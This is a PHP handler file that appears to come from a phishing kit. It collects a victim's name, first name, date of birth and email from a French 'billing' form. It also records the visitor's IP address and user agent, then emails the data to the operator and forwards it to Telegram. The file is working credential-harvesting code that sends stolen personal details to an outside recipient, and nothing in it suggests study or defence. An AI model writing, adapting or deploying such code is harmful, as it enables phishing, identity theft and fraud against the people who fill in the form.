<?php
include '../../settings.php';
include '../core/funcs.php';
session_start();

// Include PHPMailer manually
require __DIR__ . '/lib/PHPMailer/src/PHPMailer.php';
require __DIR__ . '/lib/PHPMailer/src/SMTP.php';
require __DIR__ . '/lib/PHPMailer/src/Exception.php';

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

if (isset($_POST['name'], $_POST['dob'], $_POST['email'])) {
    $_SESSION['name'] = $_POST['name'];
    $_SESSION['fname'] = $_POST['prenom'];
    $_SESSION['dob'] = $_POST['dob'];
    $_SESSION['email'] = $_POST['email'];

    $message = "≡≡≡≡≡≡≡≡ ☫🪪☫ ≡≡≡≡≡≡≡≡
      
👮🏼‍♂️ Nom : ".$_SESSION['name']."
🛠 Prénom : ".$_SESSION['fname']."
👨🏼‍⚕️ Date de naissance : ".$_SESSION['dob']."
📧 Email : ".$_SESSION['email']."
      
≡≡≡≡≡≡≡≡ ☫📶☫ ≡≡≡≡≡≡≡≡
      
📍 Adresse IP : ".$_SERVER['REMOTE_ADDR']."
📡 User Agent :" . $_SERVER['HTTP_USER_AGENT'];

    update('informations');

    // ---- SMTP Mail ----
    $mail = new PHPMailer(true);

    try {
        $mail->isSMTP();
        $mail->Host       = getenv("SMTP_HOST");
        $mail->SMTPAuth   = true;
        $mail->Username   = getenv("SMTP_USER");
        $mail->Password   = getenv("SMTP_PASS");
        $mail->SMTPSecure = 'tls';
        $mail->Port       = 587;

        $mail->setFrom('noreply@yourdomain.com', 'Your App');
        $mail->addAddress(getenv("TO_EMAIL"));

        $mail->isHTML(false);
        $mail->Subject = "🪪 + 1 Nouveaux billing : [".$_SESSION['name']."] 🪪";
        $mail->Body    = $message;

        $mail->send();
    } catch (Exception $e) {
        error_log("Mailer Error: {$mail->ErrorInfo}");
    }

    // Telegram (unchanged)
    sendTelegramRez($message, false);

    header('location: ../loading.php?page=billing.php');
}
